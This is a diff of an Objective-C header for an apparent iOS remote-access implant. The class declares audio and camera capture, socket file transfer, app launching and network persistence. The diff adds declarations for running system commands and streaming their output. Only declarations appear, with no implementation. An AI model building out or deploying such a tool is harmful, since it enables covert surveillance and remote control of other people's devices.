@@ -11,6 +11,7 @@
 #include "NSData+AESCrypt.h"
 #include "SpringBoardServices/SpringBoardServices.h"
 #import <UIKit/UIKit.h>
+#include "NSTask.h"
 
 @interface espl:NSObject <AVAudioRecorderDelegate>
 @property (nonatomic,strong) AVCaptureSession *session;
@@ -22,12 +23,15 @@
 @property (retain) NSString *terminator;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
 @property (nonatomic,retain) NSTimer *timer;
+@property (nonatomic,strong) NSTask *systask;
+
 //socks
 extern int sockfd;
 -(int)connect:(NSString*)host :(long)port;
 -(void)receiveFileData:(NSString *)saveToPath :(long)fileSize;
 -(void)sendFileData:(NSData*)fileData;
 -(void)sendString:(NSString *)string;
+-(void)liveSendString:(NSString *)string;
 
 //convenience
 -(NSString *)forgetFirst:(NSArray *)args;
@@ -69,6 +73,7 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(NSString *)battery;
 -(void)sysinfo;
 -(void)launchApp:(NSString *)arg;
+-(void)runtask:(NSString *)cmd;
 -(void)persistence:(NSString *)ip :(int)port;
 -(void)rmpersistence;
 -(void)eslog:(NSString *)str;
